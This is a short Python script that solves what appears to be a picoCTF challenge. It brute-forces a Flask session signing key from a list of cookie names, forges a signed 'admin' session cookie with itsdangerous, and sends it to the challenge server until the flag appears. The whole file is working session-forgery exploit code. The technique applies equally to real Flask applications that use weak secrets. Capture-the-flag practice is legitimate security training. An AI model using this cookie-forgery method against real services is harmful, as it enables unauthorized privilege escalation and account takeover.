#!/home/maxime/.pyvenv/bin/python3
from tqdm import tqdm
import requests
import hashlib
from itsdangerous import URLSafeTimedSerializer, Signer

key_list = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

cookie_given_b64 = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zmr-Hg.EZmO2K5if1NGsQEXrC2ii1PhJmE"
cookie_base_value = {"very_auth":"admin"}

for key in tqdm(key_list):
    cookie_signature = URLSafeTimedSerializer(key, salt="cookie-session", signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1}).dumps(cookie_base_value)
    tqdm.write(cookie_signature)
    cookie = {"session": cookie_signature}
    r = requests.get("http://mercury.picoctf.net:53700/display", cookies=cookie, allow_redirects=False)
    if "picoCTF{" in r.text:
        for line in r.text.splitlines():
            if "picoCTF{" in line:
                tqdm.write(line)
                exit()
    
